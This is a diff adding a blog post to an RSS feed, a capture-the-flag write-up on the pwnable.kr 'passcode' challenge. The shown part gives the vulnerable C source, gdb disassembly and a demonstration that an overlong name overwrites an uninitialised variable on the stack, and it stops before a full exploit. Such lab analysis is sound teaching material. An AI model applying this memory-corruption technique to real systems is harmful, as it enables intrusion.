@@ -7,6 +7,312 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Pwnable.kr - passcode</title>
+        <description>&lt;p&gt;To my surprise, I’ve noticed that I have missed one previous challenge called &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt;. Let’s come back to it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@pwnable.kr&lt;span class=&quot;s1&quot;&gt;'s password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  '&lt;/span&gt; / |  D  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   _/|  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; |___ |    _]    |    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;|    / 
+|  |  |  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87.kr@gmail.com
+- IRC : irc.netgarage.org:6667 / #pwnable.kr
+- Simply type &quot;irssi&quot; command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+Last login: Thu Jun 28 12:59:34 2018 from 213.57.214.26
+passcode@ubuntu:~$ ls -la
+total 36
+drwxr-x---  5 root passcode     4096 Oct 23  2016 .
+drwxr-xr-x 87 root root         4096 Dec 27 23:17 ..
+d---------  2 root root         4096 Jun 26  2014 .bash_history
+-r--r-----  1 root passcode_pwn   48 Jun 26  2014 flag
+dr-xr-xr-x  2 root root         4096 Aug 20  2014 .irssi
+-r-xr-sr-x  1 root passcode_pwn 7485 Jun 26  2014 passcode
+-rw-r--r--  1 root root          858 Jun 26  2014 passcode.c
+drwxr-xr-x  2 root root         4096 Oct 23  2016 .pwntools-cache&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As we have the source code available to us, we can start by taking a look at it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode1 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;// ha! mommy told me that 32bit is vulnerable to bruteforcing :)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode2 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checking...&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;338150&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13371337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login OK!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login Failed!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter you name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%100s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome %s!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Toddler's Secure Login System 1.0 beta.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;// something after login...&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Now I can safely trust you that you have credential :)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From the start we can see two simple mistakes in &lt;code class=&quot;highlighter-rouge&quot;&gt;login()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As we know, &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; will read the data from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; according to the format parameter and will store it in a &lt;strong&gt;location&lt;/strong&gt; (where location is just an address of the variable) passed by the other parameters. So both &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode2&lt;/code&gt; variables should be dereferenced in order to properly save the variables just like this.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So after that we know that solving this challenge by the classic mean of entering hardcoded password from source won’t work. Let’s fire up &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; to study this binary, looking for potential flaws.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;passcode@ubuntu:~$ gdb ./passcode 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
+Find the GDB manual and other documentation resources online at:
+&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+Reading symbols from ./passcode...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048665 &amp;lt;+0&amp;gt;:	push   ebp
+   0x08048666 &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x08048668 &amp;lt;+3&amp;gt;:	and    esp,0xfffffff0
+   0x0804866b &amp;lt;+6&amp;gt;:	sub    esp,0x10
+   0x0804866e &amp;lt;+9&amp;gt;:	mov    DWORD PTR [esp],0x80487f0
+   0x08048675 &amp;lt;+16&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
+   0x0804867a &amp;lt;+21&amp;gt;:	call   0x8048609 &amp;lt;welcome&amp;gt;
+   0x0804867f &amp;lt;+26&amp;gt;:	call   0x8048564 &amp;lt;login&amp;gt;
+   0x08048684 &amp;lt;+31&amp;gt;:	mov    DWORD PTR [esp],0x8048818
+   0x0804868b &amp;lt;+38&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
+   0x08048690 &amp;lt;+43&amp;gt;:	mov    eax,0x0
+   0x08048695 &amp;lt;+48&amp;gt;:	leave  
+   0x08048696 &amp;lt;+49&amp;gt;:	ret    
+End of assembler dump.
+(gdb) disas login
+Dump of assembler code for function login:
+   0x08048564 &amp;lt;+0&amp;gt;:	push   ebp
+   0x08048565 &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x08048567 &amp;lt;+3&amp;gt;:	sub    esp,0x28
+   0x0804856a &amp;lt;+6&amp;gt;:	mov    eax,0x8048770
+   0x0804856f &amp;lt;+11&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x08048572 &amp;lt;+14&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
+   0x08048577 &amp;lt;+19&amp;gt;:	mov    eax,0x8048783
+   0x0804857c &amp;lt;+24&amp;gt;:	mov    edx,DWORD PTR [ebp-0x10]
+   0x0804857f &amp;lt;+27&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
+   0x08048583 &amp;lt;+31&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x08048586 &amp;lt;+34&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;
+   0x0804858b &amp;lt;+39&amp;gt;:	mov    eax,ds:0x804a02c
+   0x08048590 &amp;lt;+44&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x08048593 &amp;lt;+47&amp;gt;:	call   0x8048430 &amp;lt;fflush@plt&amp;gt;
+   0x08048598 &amp;lt;+52&amp;gt;:	mov    eax,0x8048786
+   0x0804859d &amp;lt;+57&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x080485a0 &amp;lt;+60&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
+   0x080485a5 &amp;lt;+65&amp;gt;:	mov    eax,0x8048783
+   0x080485aa &amp;lt;+70&amp;gt;:	mov    edx,DWORD PTR [ebp-0xc]
+   0x080485ad &amp;lt;+73&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
+   0x080485b1 &amp;lt;+77&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x080485b4 &amp;lt;+80&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;
+   0x080485b9 &amp;lt;+85&amp;gt;:	mov    DWORD PTR [esp],0x8048799
+   0x080485c0 &amp;lt;+92&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
+   0x080485c5 &amp;lt;+97&amp;gt;:	cmp    DWORD PTR [ebp-0x10],0x528e6
+   0x080485cc &amp;lt;+104&amp;gt;:	jne    0x80485f1 &amp;lt;login+141&amp;gt;
+   0x080485ce &amp;lt;+106&amp;gt;:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
+   0x080485d5 &amp;lt;+113&amp;gt;:	jne    0x80485f1 &amp;lt;login+141&amp;gt;
+   0x080485d7 &amp;lt;+115&amp;gt;:	mov    DWORD PTR [esp],0x80487a5
+   0x080485de &amp;lt;+122&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
+   0x080485e3 &amp;lt;+127&amp;gt;:	mov    DWORD PTR [esp],0x80487af
+   0x080485ea &amp;lt;+134&amp;gt;:	call   0x8048460 &amp;lt;system@plt&amp;gt;
+   0x080485ef &amp;lt;+139&amp;gt;:	leave  
+   0x080485f0 &amp;lt;+140&amp;gt;:	ret    
+   0x080485f1 &amp;lt;+141&amp;gt;:	mov    DWORD PTR [esp],0x80487bd
+   0x080485f8 &amp;lt;+148&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
+   0x080485fd &amp;lt;+153&amp;gt;:	mov    DWORD PTR [esp],0x0
+   0x08048604 &amp;lt;+160&amp;gt;:	call   0x8048480 &amp;lt;exit@plt&amp;gt;
+End of assembler dump.
+(gdb) disas welcome
+Dump of assembler code for function welcome:
+   0x08048609 &amp;lt;+0&amp;gt;:	push   ebp
+   0x0804860a &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x0804860c &amp;lt;+3&amp;gt;:	sub    esp,0x88
+   0x08048612 &amp;lt;+9&amp;gt;:	mov    eax,gs:0x14
+   0x08048618 &amp;lt;+15&amp;gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804861b &amp;lt;+18&amp;gt;:	xor    eax,eax
+   0x0804861d &amp;lt;+20&amp;gt;:	mov    eax,0x80487cb
+   0x08048622 &amp;lt;+25&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x08048625 &amp;lt;+28&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
+   0x0804862a &amp;lt;+33&amp;gt;:	mov    eax,0x80487dd
+
+   0x0804863e &amp;lt;+53&amp;gt;:	mov    eax,0x80487e3
+   0x08048643 &amp;lt;+58&amp;gt;:	lea    edx,[ebp-0x70]
+   0x08048646 &amp;lt;+61&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
+   0x0804864a &amp;lt;+65&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x0804864d &amp;lt;+68&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
+   0x08048652 &amp;lt;+73&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048655 &amp;lt;+76&amp;gt;:	xor    eax,DWORD PTR gs:0x14
+   0x0804865c &amp;lt;+83&amp;gt;:	je     0x8048663 &amp;lt;welcome+90&amp;gt;
+---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
+   0x0804865e &amp;lt;+85&amp;gt;:	call   0x8048440 &amp;lt;__stack_chk_fail@plt&amp;gt;
+   0x08048663 &amp;lt;+90&amp;gt;:	leave  
+   0x08048664 &amp;lt;+91&amp;gt;:	ret    
+End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This is the disassembly of two functions that we’re going to mostly work on. We can analyze the &lt;code class=&quot;highlighter-rouge&quot;&gt;welcome()&lt;/code&gt; function that will read username and pass it to the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; variable. From assembly we can view the part of the code that will read the name.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x0804862f &amp;lt;+38&amp;gt;:	lea    edx,[ebp-0x70]
+   0x08048632 &amp;lt;+41&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
+   0x08048636 &amp;lt;+45&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x08048639 &amp;lt;+48&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here we can see instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;lea&lt;/code&gt; performed on &lt;code class=&quot;highlighter-rouge&quot;&gt;edx&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x70&lt;/code&gt;. We can translate it just as load the effective address (calculate it) and store in the &lt;code class=&quot;highlighter-rouge&quot;&gt;edx&lt;/code&gt; register. From that information, we know that variable &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x70&lt;/code&gt; is the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; variable.&lt;/p&gt;
+
+&lt;p&gt;In the next function - &lt;code class=&quot;highlighter-rouge&quot;&gt;welcome()&lt;/code&gt;, we can see the part that will make use of &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;   0x0804857c &amp;lt;+24&amp;gt;:	mov    edx,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x10]
+   0x0804857f &amp;lt;+27&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],edx
+   0x08048583 &amp;lt;+31&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
+   0x08048586 &amp;lt;+34&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But here, other than in previous example we don’t calculate the address of the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt;, we just use it’s value with &lt;code class=&quot;highlighter-rouge&quot;&gt;mov edx,DWORD PTR [ebp-0x10]&lt;/code&gt;. All the same with &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode2&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;mov edx,DWORD PTR [ebp-0xc]&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So what can we do with this information? After looking for a while, I noticed that the difference between &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable is smalled than &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt;, which is the size of the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That way we can overwrite value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; by entering 96 characters in name, and using last 4 characters as the part for &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt;. In order to demonstrate it, we can set a breakpoint just before the first &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;login()&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x08048583
+Breakpoint 1 at 0x8048583&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can run the binary, with input consisting of 100 ‘A’ letters.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
+Starting program: /home/passcode/passcode 
+Toddler&lt;span class=&quot;s1&quot;&gt;'s Secure Login System 1.0 beta.
+enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+(gdb) x/s $ebp-0x10
+0xff910158:	&quot;AAAA&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;See? These 4 ‘A’ letters are inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable. But as we can’t modify the second variable, we still can’t solve this challenge. Let’s look at the source code once again.&lt;/p&gt;
+
